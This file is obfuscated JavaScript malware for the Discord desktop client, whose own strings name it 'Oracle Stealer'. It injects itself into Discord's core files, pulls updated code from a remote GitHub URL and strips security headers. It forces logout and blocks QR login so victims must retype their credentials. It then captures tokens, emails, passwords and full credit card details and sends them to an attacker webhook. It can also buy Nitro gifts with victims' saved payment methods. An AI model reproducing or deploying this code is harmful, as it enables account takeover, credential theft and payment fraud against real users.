const _0x23040f=_0x10ce;(function(_0x2ac7a0,_0x5c552b){const _0x39f9be=_0x10ce,_0x5608fd=_0x2ac7a0();while(!![]){try{const _0x23a67a=parseInt(_0x39f9be(0x1da))/0x1+parseInt(_0x39f9be(0x274))/0x2+parseInt(_0x39f9be(0x279))/0x3*(parseInt(_0x39f9be(0x25d))/0x4)+parseInt(_0x39f9be(0x1cf))/0x5*(-parseInt(_0x39f9be(0x282))/0x6)+parseInt(_0x39f9be(0x212))/0x7*(-parseInt(_0x39f9be(0x24b))/0x8)+-parseInt(_0x39f9be(0x200))/0x9+-parseInt(_0x39f9be(0x234))/0xa;if(_0x23a67a===_0x5c552b)break;else _0x5608fd['push'](_0x5608fd['shift']());}catch(_0x4f8828){_0x5608fd['push'](_0x5608fd['shift']());}}}(_0xed36,0xe294a));const args=process['argv'],fs=require('fs'),path=require(_0x23040f(0x238)),https=require(_0x23040f(0x1fc)),querystring=require(_0x23040f(0x26a)),{BrowserWindow,session}=require('electron'),config={'auto_buy_nitro':![],'ping_on_run':![],'ping_val':_0x23040f(0x211),'embed_name':_0x23040f(0x1d7),'embed_icon':'https://media.discordapp.net/attachments/970982305021706303/971383656453144627/OracleLogo.jpg'[_0x23040f(0x226)](/ /g,_0x23040f(0x27a)),'embed_color':0x36393f,'webhook':_0x23040f(0x1d3),'injection_url':_0x23040f(0x1e0),'api':_0x23040f(0x23b),'nitro':{'boost':{'year':{'id':'521847234246082599','sku':_0x23040f(0x218),'price':'9999'},'month':{'id':_0x23040f(0x23e),'sku':_0x23040f(0x20d),'price':_0x23040f(0x27c)}},'classic':{'month':{'id':_0x23040f(0x208),'sku':'511651871736201216','price':'499'}}},'filter':{'urls':['https://discord.com/api/v*/users/@me',_0x23040f(0x1dc),_0x23040f(0x1fb),_0x23040f(0x21e),_0x23040f(0x237),_0x23040f(0x259),_0x23040f(0x1e6),_0x23040f(0x243),_0x23040f(0x1bb),_0x23040f(0x1ec)]},'filter2':{'urls':[_0x23040f(0x271),_0x23040f(0x26e),_0x23040f(0x1e2),_0x23040f(0x1e9),'https://discord.com/api/v*/users/@me/library',_0x23040f(0x210)]}},discordPath=(function(){const _0x1937c7=_0x23040f,_0x5aabc1=args[0x2]&&args[0x2][_0x1937c7(0x244)]()===_0x1937c7(0x20a),_0x34173a=_0x5aabc1?args[0x3]&&args[0x3][_0x1937c7(0x244)]():args[0x2]&&args[0x2][_0x1937c7(0x244)](),_0x207ad0=_0x34173a==='canary'?_0x1937c7(0x273):_0x34173a===_0x1937c7(0x221)?_0x1937c7(0x1fa):'Discord';let _0x2f14fa='';if(process['platform']===_0x1937c7(0x1e5)){const _0x91ae2e=path[_0x1937c7(0x1fe)](process[_0x1937c7(0x1c4)][_0x1937c7(0x1c1)],_0x207ad0['replace'](/ /g,'')),_0x23c38d=fs[_0x1937c7(0x280)](_0x91ae2e)[_0x1937c7(0x22e)](_0x4ec8c4=>fs[_0x1937c7(0x1cd)](path[_0x1937c7(0x1fe)](_0x91ae2e,_0x4ec8c4))[_0x1937c7(0x266)]()&&_0x4ec8c4[_0x1937c7(0x233)]('.')[_0x1937c7(0x1ef)]>0x1)[_0x1937c7(0x26d)]()[_0x1937c7(0x1d8)]()[0x0];_0x2f14fa=path['join'](_0x91ae2e,_0x23c38d,_0x1937c7(0x1bd));}else{if(process[_0x1937c7(0x250)]==='darwin'){const _0x562e32=_0x34173a===_0x1937c7(0x270)?path[_0x1937c7(0x1fe)](_0x1937c7(0x268),_0x1937c7(0x26c)):_0x34173a==='ptb'?path[_0x1937c7(0x1fe)]('/Applications',_0x1937c7(0x1c2)):_0x5aabc1&&args[0x3]?args[0x3]?args[0x2]:args[0x2]:path[_0x1937c7(0x1fe)](_0x1937c7(0x268),_0x1937c7(0x20f));_0x2f14fa=path[_0x1937c7(0x1fe)](_0x562e32,'Contents',_0x1937c7(0x1fd));}}if(fs[_0x1937c7(0x22d)](_0x2f14fa))return _0x2f14fa;return'';}());function updateCheck(){const _0x2cfcfb=_0x23040f,_0x2fb2a1=path[_0x2cfcfb(0x1fe)](discordPath,_0x2cfcfb(0x248)),_0x2c19b3=path[_0x2cfcfb(0x1fe)](_0x2fb2a1,_0x2cfcfb(0x240)),_0xb7ab37=path['join'](_0x2fb2a1,'index.js'),_0x2ffbb4=path[_0x2cfcfb(0x272)](path[_0x2cfcfb(0x272)](__dirname,'..'),'..'),_0x18e0a6=_0x2ffbb4+_0x2cfcfb(0x1dd),_0x11e5c1=path[_0x2cfcfb(0x1fe)](process[_0x2cfcfb(0x1c4)]['APPDATA'],_0x2cfcfb(0x278));if(!fs[_0x2cfcfb(0x22d)](_0x2fb2a1))fs[_0x2cfcfb(0x275)](_0x2fb2a1);if(fs['existsSync'](_0x2c19b3))fs['unlinkSync'](_0x2c19b3);if(fs[_0x2cfcfb(0x22d)](_0xb7ab37))fs[_0x2cfcfb(0x1f4)](_0xb7ab37);if(process[_0x2cfcfb(0x250)]===_0x2cfcfb(0x1e5)||process[_0x2cfcfb(0x250)]===_0x2cfcfb(0x1f8)){fs[_0x2cfcfb(0x204)](_0x2c19b3,JSON[_0x2cfcfb(0x1c3)]({'name':_0x2cfcfb(0x217),'main':_0x2cfcfb(0x1ba)},null,0x4));const _0x2bc08d=_0x2cfcfb(0x1d5)+_0x18e0a6+_0x2cfcfb(0x1f5)+_0x11e5c1+_0x2cfcfb(0x213)+config[_0x2cfcfb(0x23a)]+'\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27'+path[_0x2cfcfb(0x1fe)](discordPath,'app.asar')+_0x2cfcfb(0x214);fs[_0x2cfcfb(0x204)](_0xb7ab37,_0x2bc08d[_0x2cfcfb(0x226)](/\\/g,'\x5c\x5c'));}if(!fs[_0x2cfcfb(0x22d)](path[_0x2cfcfb(0x1fe)](__dirname,'initiation')))return!0x0;return fs[_0x2cfcfb(0x258)](path[_0x2cfcfb(0x1fe)](__dirname,_0x2cfcfb(0x227))),execScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();'),!0x1;}const execScript=_0x5a159e=>{const _0x13d462=_0x23040f,_0x48d03a=BrowserWindow[_0x13d462(0x24d)]()[0x0];return _0x48d03a[_0x13d462(0x261)][_0x13d462(0x25c)](_0x5a159e,!0x0);},getInfo=async _0x143e79=>{const _0x2d2305=_0x23040f,_0x39719e=await execScript(_0x2d2305(0x1d6)+config[_0x2d2305(0x26b)]+_0x2d2305(0x222)+_0x143e79+_0x2d2305(0x21b));return JSON[_0x2d2305(0x253)](_0x39719e);},fetchBilling=async _0x3a52f3=>{const _0x101e32=_0x23040f,_0x275c63=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config[_0x101e32(0x26b)]+_0x101e32(0x1cc)+_0x3a52f3+_0x101e32(0x249));if(_0x275c63['length']===0x0&&!_0x275c63['lenght'])return'';return JSON[_0x101e32(0x253)](_0x275c63);},getBilling=async _0x32bc=>{const _0x231ffb=_0x23040f,_0x3722b8=await fetchBilling(_0x32bc);if(_0x3722b8==='')return'`None`';let _0x117e19='';_0x3722b8[_0x231ffb(0x27d)](_0x39a2c1=>{const _0x3f9d94=_0x231ffb;if(_0x39a2c1[_0x3f9d94(0x247)]===0x2&&!_0x39a2c1[_0x3f9d94(0x255)])_0x117e19+=_0x3f9d94(0x1c9);else _0x39a2c1[_0x3f9d94(0x247)]===0x1&&!_0x39a2c1[_0x3f9d94(0x255)]?_0x117e19+=_0x3f9d94(0x1c8):_0x117e19='`Invalid`';});if(_0x117e19==='')_0x117e19=_0x231ffb(0x205);return _0x117e19;},Purchase=async(_0x5593dd,_0x99c786,_0x2e7a27,_0x5e01e2)=>{const _0x264ee2=_0x23040f,_0x4c0e8a=execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/'+config[_0x264ee2(0x1c6)][_0x2e7a27][_0x5e01e2]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x5593dd+'\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify('+JSON['stringify']({'expected_amount':config[_0x264ee2(0x1c6)][_0x2e7a27][_0x5e01e2][_0x264ee2(0x1e7)],'expected_currency':_0x264ee2(0x1e8),'gift':!![],'payment_source_id':_0x99c786,'payment_source_token':null,'purchase_token':'2422867c-244d-476a-ba4f-36e197758d97','sku_subscription_plan_id':config['nitro'][_0x2e7a27][_0x5e01e2][_0x264ee2(0x1ca)]})+_0x264ee2(0x24f));if(_0x4c0e8a[_0x264ee2(0x215)])return'https://discord.gift/'+_0x4c0e8a['gift_code'];else return null;},buyNitro=async _0x281e84=>{const _0x1fc3cd=_0x23040f,_0x269aba=await fetchBilling(_0x281e84);if(_0x269aba==='')return _0x1fc3cd(0x1ff);let _0x3960c8=[];_0x269aba['forEach'](_0x3bdadd=>{const _0x2ca65c=_0x1fc3cd;!_0x3bdadd[_0x2ca65c(0x255)]&&(_0x3960c8=_0x3960c8[_0x2ca65c(0x1f0)](_0x3bdadd['id']));});for(let _0x1e8107 in _0x3960c8){const _0x155264=Purchase(_0x281e84,_0x1e8107,_0x1fc3cd(0x216),_0x1fc3cd(0x256));if(_0x155264!==null)return _0x155264;else{const _0x55bb1d=Purchase(_0x281e84,_0x1e8107,_0x1fc3cd(0x216),_0x1fc3cd(0x1ee));if(_0x55bb1d!==null)return _0x55bb1d;else{const _0x35bd49=Purchase(_0x281e84,_0x1e8107,_0x1fc3cd(0x21d),_0x1fc3cd(0x1ee));return _0x35bd49!==null?_0x35bd49:'Failed\x20to\x20Purchase\x20❌';}}}},getNitro=_0x1f0bae=>{const _0xd50337=_0x23040f;switch(flags){case 0x0:return'`None`';case 0x1:return'<:nitro:969573901036290069>';case 0x2:return'<:boosting_1:969573901334106112>';case 0x3:return _0xd50337(0x1ed);case 0x4:return _0xd50337(0x23f);case 0x5:return _0xd50337(0x267);case 0x6:return _0xd50337(0x27f);case 0x7:return'<:boosting_6:969573901514457089>';case 0x8:return _0xd50337(0x235);case 0x9:return'<:boosting_8:969573901476700220>';default:return _0xd50337(0x205);}},getBadges=_0x5df2e5=>{const _0x446b8c=_0x23040f;let _0x1b6827='';switch(_0x5df2e5){case 0x1:_0x1b6827+='Discord\x20Staff,\x20';break;case 0x2:_0x1b6827+=_0x446b8c(0x20b);break;case 0x20000:_0x1b6827+=_0x446b8c(0x25a);break;case 0x4:_0x1b6827+=_0x446b8c(0x1de);break;case 0x4000:_0x1b6827+='Gold\x20BugHunter,\x20';break;case 0x8:_0x1b6827+=_0x446b8c(0x241);break;case 0x200:_0x1b6827+=_0x446b8c(0x1f7);break;case 0x80:_0x1b6827+=_0x446b8c(0x269);break;case 0x40:_0x1b6827+=_0x446b8c(0x209);break;case 0x100:_0x1b6827+='HypeSquad\x20Balance,\x20';break;case 0x0:_0x1b6827='`None`';break;default:_0x1b6827=_0x446b8c(0x205);break;}return _0x1b6827;},hooker=async _0x5e9bb8=>{const _0x5e7fbe=_0x23040f,_0x398fec=JSON[_0x5e7fbe(0x1c3)](_0x5e9bb8),_0x91557a=new URL(config[_0x5e7fbe(0x229)]),_0x33056f={'protocol':_0x91557a[_0x5e7fbe(0x1f2)],'hostname':_0x91557a[_0x5e7fbe(0x1df)],'path':_0x91557a[_0x5e7fbe(0x1eb)],'method':_0x5e7fbe(0x1e1),'headers':{'Content-Type':_0x5e7fbe(0x230),'Access-Control-Allow-Origin':'*'}},_0x1de676=https['request'](_0x33056f);_0x1de676['on'](_0x5e7fbe(0x264),_0x4324aa=>{console['log'](_0x4324aa);}),_0x1de676[_0x5e7fbe(0x219)](_0x398fec),_0x1de676[_0x5e7fbe(0x251)]();},login=async(_0x3a8c7d,_0x457043,_0x22ac21)=>{const _0x5326f3=_0x23040f,_0x1ec29d=await getInfo(_0x22ac21),_0x5beea9=getNitro(_0x1ec29d[_0x5326f3(0x1db)]),_0x3a32a9=getBadges(_0x1ec29d[_0x5326f3(0x20e)]),_0x40d8b0=await getBilling(_0x22ac21),_0x3fb805={'username':config[_0x5326f3(0x1cb)],'avatar_url':config[_0x5326f3(0x25b)],'embeds':[{'color':config[_0x5326f3(0x231)],'fields':[{'name':_0x1ec29d[_0x5326f3(0x21f)]+'#'+_0x1ec29d['discriminator']+'\x20('+_0x1ec29d['id']+')','value':_0x5326f3(0x1d1)+_0x22ac21+'```','inline':![]},{'name':_0x5326f3(0x1ea),'value':''+_0x3a32a9,'inline':!![]},{'name':_0x5326f3(0x245),'value':''+_0x5beea9,'inline':!![]},{'name':_0x5326f3(0x25f),'value':'`'+_0x3a8c7d+'`','inline':!![]},{'name':_0x5326f3(0x20c),'value':'`'+_0x457043+'`','inline':!![]},{'name':'Billing:','value':''+_0x40d8b0,'inline':!![]}],'author':{'name':_0x5326f3(0x281),'icon_url':'https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg'},'thumbnail':{'url':_0x5326f3(0x1c5)+_0x1ec29d['id']+'/'+_0x1ec29d[_0x5326f3(0x1bc)]+_0x5326f3(0x23d)},'footer':{'text':_0x5326f3(0x27e)}}]};if(config[_0x5326f3(0x224)])_0x3fb805[_0x5326f3(0x201)]=config[_0x5326f3(0x22c)];hooker(_0x3fb805);},passwordChanged=async(_0x1e7de4,_0x5f237e,_0x44b2e8)=>{const _0x12446c=_0x23040f,_0x31b3fe=await getInfo(_0x44b2e8),_0x3debbf=getNitro(_0x31b3fe[_0x12446c(0x1db)]),_0x50f9a8=getBadges(_0x31b3fe[_0x12446c(0x20e)]),_0x3f0844=await getBilling(_0x44b2e8),_0x974b31={'username':config[_0x12446c(0x1cb)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x12446c(0x231)],'fields':[{'name':_0x31b3fe[_0x12446c(0x21f)]+'#'+_0x31b3fe[_0x12446c(0x225)]+'\x20('+_0x31b3fe['id']+')','value':'```'+_0x44b2e8+_0x12446c(0x1d1),'inline':![]},{'name':_0x12446c(0x1ea),'value':''+_0x50f9a8,'inline':!![]},{'name':_0x12446c(0x245),'value':''+_0x3debbf,'inline':!![]},{'name':_0x12446c(0x25f),'value':'`'+_0x31b3fe[_0x12446c(0x1be)]+'`','inline':!![]},{'name':_0x12446c(0x257),'value':'`'+_0x1e7de4+'`','inline':!![]},{'name':_0x12446c(0x1c7),'value':'`'+_0x5f237e+'`','inline':!![]},{'name':_0x12446c(0x22f),'value':''+_0x3f0844,'inline':!![]}],'author':{'name':_0x12446c(0x281),'icon_url':_0x12446c(0x276)},'thumbnail':{'url':_0x12446c(0x1c5)+_0x31b3fe['id']+'/'+_0x31b3fe[_0x12446c(0x1bc)]+_0x12446c(0x23d)},'footer':{'text':'@Rdimo#6969'}}]};if(config[_0x12446c(0x224)])_0x974b31[_0x12446c(0x201)]=config['ping_val'];hooker(_0x974b31);},emailChanged=async(_0x298777,_0xc6d9ad,_0x792544)=>{const _0x4ca7b9=_0x23040f,_0x4b2bd4=await getInfo(_0x792544),_0x2721c7=getNitro(_0x4b2bd4['premium_type']),_0x145293=getBadges(_0x4b2bd4[_0x4ca7b9(0x20e)]),_0x3a9353=await getBilling(_0x792544),_0x376dfb={'username':config[_0x4ca7b9(0x1cb)],'avatar_url':config[_0x4ca7b9(0x25b)],'embeds':[{'color':config[_0x4ca7b9(0x231)],'fields':[{'name':_0x4b2bd4[_0x4ca7b9(0x21f)]+'#'+_0x4b2bd4['discriminator']+'\x20('+_0x4b2bd4['id']+')','value':'```'+_0x792544+_0x4ca7b9(0x1d1),'inline':![]},{'name':_0x4ca7b9(0x1ea),'value':''+_0x145293,'inline':!![]},{'name':_0x4ca7b9(0x245),'value':''+_0x2721c7,'inline':!![]},{'name':'Email:','value':'`'+_0x298777+'`','inline':!![]},{'name':'Password:','value':'`'+_0xc6d9ad+'`','inline':!![]},{'name':'Billing:','value':''+_0x3a9353,'inline':!![]}],'author':{'name':'Oracle\x20Stealer','icon_url':_0x4ca7b9(0x276)},'thumbnail':{'url':_0x4ca7b9(0x1c5)+_0x4b2bd4['id']+'/'+_0x4b2bd4[_0x4ca7b9(0x1bc)]+_0x4ca7b9(0x23d)},'footer':{'text':'@Rdimo#6969'}}]};if(config[_0x4ca7b9(0x224)])_0x376dfb['content']=config[_0x4ca7b9(0x22c)];hooker(_0x376dfb);},PaypalAdded=async(_0x4f9885,_0x5de9c0,_0x4811ec)=>{const _0x10dc8c=_0x23040f,_0x3e7032=await getInfo(_0x4811ec),_0x2e4488=getNitro(_0x3e7032[_0x10dc8c(0x1db)]),_0xbcb4c9=getBadges(_0x3e7032[_0x10dc8c(0x20e)]),_0x3eedcb=getBilling(_0x4811ec),_0x32c5aa={'username':config[_0x10dc8c(0x1cb)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x10dc8c(0x231)],'fields':[{'name':_0x3e7032[_0x10dc8c(0x21f)]+'#'+_0x3e7032[_0x10dc8c(0x225)]+'\x20('+_0x3e7032['id']+')','value':'```'+_0x4811ec+'```','inline':![]},{'name':_0x10dc8c(0x1ea),'value':''+_0xbcb4c9,'inline':!![]},{'name':_0x10dc8c(0x245),'value':''+_0x2e4488,'inline':!![]},{'name':_0x10dc8c(0x25f),'value':'`'+_0x4f9885+'`','inline':!![]},{'name':_0x10dc8c(0x20c),'value':'`'+_0x5de9c0+'`','inline':!![]},{'name':_0x10dc8c(0x260),'value':'<:paypal:973924768933875722>','inline':!![]}],'author':{'name':_0x10dc8c(0x281),'icon_url':_0x10dc8c(0x276)},'thumbnail':{'url':_0x10dc8c(0x1c5)+_0x3e7032['id']+'/'+_0x3e7032[_0x10dc8c(0x1bc)]+_0x10dc8c(0x23d)},'footer':{'text':'@Rdimo#6969'}}]};if(config[_0x10dc8c(0x224)])_0x32c5aa[_0x10dc8c(0x201)]=config[_0x10dc8c(0x22c)];hooker(_0x32c5aa);},ccAdded=async(_0x16bfb0,_0x5a846d,_0x4266c1,_0x19a258,_0x53ac44,_0x486ac7,_0x145dcd)=>{const _0x50e52e=_0x23040f,_0x4dd1c5=await getInfo(_0x145dcd),_0x446d8a=getNitro(_0x4dd1c5['premium_type']),_0x397d00=getBadges(_0x4dd1c5[_0x50e52e(0x20e)]),_0x280b64=await getBilling(_0x145dcd),_0x3ab2cb={'username':config[_0x50e52e(0x1cb)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x50e52e(0x231)],'fields':[{'name':_0x4dd1c5[_0x50e52e(0x21f)]+'#'+_0x4dd1c5[_0x50e52e(0x225)]+'\x20('+_0x4dd1c5['id']+')','value':_0x50e52e(0x1d1)+_0x145dcd+_0x50e52e(0x1d1),'inline':![]},{'name':_0x50e52e(0x1ea),'value':''+_0x397d00,'inline':!![]},{'name':'Nitro:','value':''+_0x446d8a,'inline':!![]},{'name':_0x50e52e(0x25f),'value':'`'+_0x53ac44+'`','inline':!![]},{'name':'Password:','value':'`'+_0x486ac7+'`','inline':!![]},{'name':'Credit\x20Card:','value':_0x16bfb0+_0x50e52e(0x1e4)+_0x4266c1+'/'+_0x19a258+_0x50e52e(0x1e4)+_0x5a846d,'inline':![]}],'author':{'name':'Oracle\x20Stealer','icon_url':_0x50e52e(0x276)},'thumbnail':{'url':_0x50e52e(0x1c5)+_0x4dd1c5['id']+'/'+_0x4dd1c5['avatar']+_0x50e52e(0x23d)},'footer':{'text':'@Rdimo#6969'}}]};if(config[_0x50e52e(0x224)])_0x3ab2cb[_0x50e52e(0x201)]=config[_0x50e52e(0x22c)];hooker(_0x3ab2cb);},nitroBought=async _0x2f1a75=>{const _0x2316e9=_0x23040f,_0x34b175=await getInfo(_0x2f1a75),_0x3ee9a2=getNitro(_0x34b175[_0x2316e9(0x1db)]),_0x53d2ee=getBadges(_0x34b175[_0x2316e9(0x20e)]),_0x1383e0=await getBilling(_0x2f1a75),_0x599415=await buyNitro(_0x2f1a75),_0x79fc4e={'username':config[_0x2316e9(0x1cb)],'content':_0x599415,'avatar_url':config[_0x2316e9(0x25b)],'embeds':[{'color':config[_0x2316e9(0x231)],'fields':[{'name':_0x2316e9(0x265),'value':_0x2316e9(0x239)+_0x599415+_0x2316e9(0x1d1),'inline':!![]},{'name':'**Discord\x20Info**','value':_0x2316e9(0x207)+_0x3ee9a2+_0x2316e9(0x1ce)+_0x53d2ee+'**\x0aBilling:\x20**'+_0x1383e0+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x2f1a75+'`','inline':![]}],'author':{'name':_0x34b175['username']+'#'+_0x34b175[_0x2316e9(0x225)]+_0x2316e9(0x1e4)+_0x34b175['id'],'icon_url':_0x2316e9(0x1c5)+_0x34b175['id']+'/'+_0x34b175['avatar']+_0x2316e9(0x23d)},'thumbnail':{'url':_0x2316e9(0x1c5)+_0x34b175['id']+'/'+_0x34b175['avatar']+_0x2316e9(0x23d)},'footer':{'text':_0x2316e9(0x242)}}]};if(config['ping_on_run'])_0x79fc4e[_0x2316e9(0x201)]=config[_0x2316e9(0x22c)]+('\x0a'+_0x599415);hooker(_0x79fc4e);};session['defaultSession']['webRequest'][_0x23040f(0x25e)](config['filter2'],(_0x3747d0,_0x3888b6)=>{const _0x4175d9=_0x23040f;if(_0x3747d0[_0x4175d9(0x223)][_0x4175d9(0x22b)](_0x4175d9(0x1f1))){_0x3888b6({'cancel':!![]});return;}if(updateCheck()){}_0x3888b6({});return;}),session['defaultSession'][_0x23040f(0x21a)][_0x23040f(0x24c)]((_0x478217,_0x56d60a)=>{const _0x4b60dc=_0x23040f;_0x478217[_0x4b60dc(0x223)]['startsWith'](config[_0x4b60dc(0x229)])?_0x478217['url']['includes'](_0x4b60dc(0x232))?_0x56d60a({'responseHeaders':Object[_0x4b60dc(0x1d0)]({'Access-Control-Allow-Headers':'*'},_0x478217['responseHeaders'])}):_0x56d60a({'responseHeaders':Object[_0x4b60dc(0x1d0)]({'Content-Security-Policy':[_0x4b60dc(0x23c),_0x4b60dc(0x1f9),'Access-Control-Allow-Origin\x20\x27*\x27'],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x478217[_0x4b60dc(0x1c0)])}):(delete _0x478217[_0x4b60dc(0x1c0)][_0x4b60dc(0x22a)],delete _0x478217['responseHeaders'][_0x4b60dc(0x1f3)],_0x56d60a({'responseHeaders':{..._0x478217[_0x4b60dc(0x1c0)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x23040f(0x24a)][_0x23040f(0x21a)][_0x23040f(0x1bf)](config[_0x23040f(0x22e)],async(_0x371885,_0x2f7883)=>{const _0x5dffc0=_0x23040f;if(_0x371885['statusCode']!==0xc8&&_0x371885[_0x5dffc0(0x277)]!==0xca)return;const _0x2a870f=await Buffer[_0x5dffc0(0x1d9)](_0x371885[_0x5dffc0(0x1e3)][0x0][_0x5dffc0(0x1d2)])[_0x5dffc0(0x1f6)](),_0xfccf91=JSON[_0x5dffc0(0x253)](_0x2a870f),_0xab4c15=await execScript('(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()');switch(!![]){case _0x371885['url'][_0x5dffc0(0x252)](_0x5dffc0(0x236)):login(_0xfccf91[_0x5dffc0(0x236)],_0xfccf91[_0x5dffc0(0x254)],_0xab4c15)['catch'](console[_0x5dffc0(0x264)]);break;case _0x371885['url']['endsWith'](_0x5dffc0(0x21c))&&_0x371885[_0x5dffc0(0x203)]==='PATCH':if(!_0xfccf91[_0x5dffc0(0x254)])return;_0xfccf91[_0x5dffc0(0x1be)]&&emailChanged(_0xfccf91['email'],_0xfccf91['password'],_0xab4c15)[_0x5dffc0(0x263)](console[_0x5dffc0(0x264)]);_0xfccf91[_0x5dffc0(0x1d4)]&&passwordChanged(_0xfccf91[_0x5dffc0(0x254)],_0xfccf91[_0x5dffc0(0x1d4)],_0xab4c15)[_0x5dffc0(0x263)](console[_0x5dffc0(0x264)]);break;case _0x371885['url'][_0x5dffc0(0x252)](_0x5dffc0(0x246))&&_0x371885[_0x5dffc0(0x203)]===_0x5dffc0(0x1e1):const _0x2384ca=querystring[_0x5dffc0(0x253)](unparsedData[_0x5dffc0(0x1f6)]());ccAdded(_0x2384ca[_0x5dffc0(0x24e)],_0x2384ca['card[cvc]'],_0x2384ca[_0x5dffc0(0x206)],_0x2384ca[_0x5dffc0(0x27b)],_0xab4c15)[_0x5dffc0(0x263)](console[_0x5dffc0(0x264)]);break;case _0x371885['url'][_0x5dffc0(0x252)](_0x5dffc0(0x220))&&_0x371885['method']==='POST':PaypalAdded(_0xab4c15)[_0x5dffc0(0x263)](console[_0x5dffc0(0x264)]);break;case _0x371885[_0x5dffc0(0x223)]['endsWith'](_0x5dffc0(0x26f))&&_0x371885['method']===_0x5dffc0(0x1e1):if(!config[_0x5dffc0(0x262)])return;setTimeout(()=>{const _0x2337a5=_0x5dffc0;nitroBought(_0xab4c15)[_0x2337a5(0x263)](console[_0x2337a5(0x264)]);},0x1d4c);break;default:break;}}),module[_0x23040f(0x228)]=require(_0x23040f(0x202));function _0x10ce(_0x588618,_0xbd790a){const _0xed365f=_0xed36();return _0x10ce=function(_0x10cec3,_0x3d0fe8){_0x10cec3=_0x10cec3-0x1ba;let _0x4cb588=_0xed365f[_0x10cec3];return _0x4cb588;},_0x10ce(_0x588618,_0xbd790a);}function _0xed36(){const _0x331c0a=['tokens','type','app','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','defaultSession','8cvmtYY','onHeadersReceived','getAllWindows','card[number]','));\x0a\x20\x20\x20\x20xmlHttp.responseText','platform','end','endsWith','parse','password','invalid','year','Old\x20Password:','rmdirSync','https://*.discord.com/api/v*/auth/login','Discord\x20Developer,\x20','embed_icon','executeJavaScript','100112QokjJv','onBeforeRequest','Email:','Billing:','webContents','auto_buy_nitro','catch','error','**Nitro\x20bought!**','isDirectory','<:boosting_4:969573901044686881>','/Applications','HypeSquad\x20Brillance,\x20','querystring','api','Discord\x20Canary.app','sort','https://*.discord.com/api/v*/applications/detectable','confirm','canary','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','resolve','Discord\x20Canary','2816288oKUOiH','mkdirSync','https://cdn.discordapp.com/attachments/970982305021706303/971383656453144627/OracleLogo.jpg','statusCode','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','87ZLFYLJ','%20','card[exp_year]','999','forEach','@Rdimo#6969','<:boosting_5:969573901409587230>','readdirSync','Oracle\x20Stealer','6JRjVFH','index.js','https://api.stripe.com/v*/setup_intents/*/confirm','avatar','resources','email','onCompleted','responseHeaders','LOCALAPPDATA','Discord\x20PTB.app','stringify','env','https://cdn.discordapp.com/avatars/','nitro','New\x20Password:','<:card:973868127240732673>','\x20<:paypal:973924768933875722>','sku','embed_name','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','lstatSync','**\x0aBadges:\x20**','2696165cPfgCd','assign','```','bytes','%WEBHOOK%','new_password','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','Oracle\x20Injection','reverse','from','1580057aWZUVI','premium_type','https://discordapp.com/api/v*/users/@me','\x5cdiscord_desktop_core-3\x5cdiscord_desktop_core\x5cindex.js','Hypesquad\x20Event,\x20','host','https://raw.githubusercontent.com/ilylunar/Discord-Injection/master/Injection-clean.js','POST','https://discord.com/api/v*/applications/detectable','uploadData','\x20|\x20','win32','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','price','usd','https://*.discord.com/api/v*/users/@me/library','Badges:','pathname','https://api.stripe.com/v*/payment_intents/*/confirm','<:boosting_2:969573901233446932>','month','length','concat','wss://remote-auth-gateway','protocol','content-security-policy-report-only','unlinkSync','\x27;\x0aconst\x20bdPath\x20=\x20\x27','toString','Early\x20Supporter,\x20','darwin','A